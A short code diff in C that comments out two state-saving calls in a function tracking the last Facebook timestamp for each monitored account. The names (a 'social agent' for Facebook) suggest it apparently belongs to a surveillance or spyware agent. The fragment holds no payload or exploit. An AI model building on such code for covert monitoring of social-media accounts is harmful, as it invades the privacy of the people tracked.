@@ -105,7 +105,7 @@ void SetLastFBTstamp(char *user, DWORD tstamp_lo, DWORD tstamp_hi)
 				return;
 			last_tstamp_array[i].tstamp_hi = tstamp_hi;
 			last_tstamp_array[i].tstamp_lo = tstamp_lo;
-			Log_SaveAgentState(PM_SOCIALAGENT_FB, (BYTE *)last_tstamp_array, MAX_FACEBOOK_ACCOUNTS*sizeof(last_tstamp_struct));
+			//--Log_SaveAgentState(PM_SOCIALAGENT_FB, (BYTE *)last_tstamp_array, MAX_FACEBOOK_ACCOUNTS*sizeof(last_tstamp_struct));
 			return;
 		}
 	}
@@ -116,7 +116,7 @@ void SetLastFBTstamp(char *user, DWORD tstamp_lo, DWORD tstamp_hi)
 			_snprintf_s(last_tstamp_array[i].user, 48, _TRUNCATE, "%s", user);		
 			last_tstamp_array[i].tstamp_hi = tstamp_hi;
 			last_tstamp_array[i].tstamp_lo = tstamp_lo;
-			Log_SaveAgentState(PM_SOCIALAGENT_FB, (BYTE *)last_tstamp_array, MAX_FACEBOOK_ACCOUNTS*sizeof(last_tstamp_struct));
+			//--Log_SaveAgentState(PM_SOCIALAGENT_FB, (BYTE *)last_tstamp_array, MAX_FACEBOOK_ACCOUNTS*sizeof(last_tstamp_struct));
 			return;
 		}
 	}
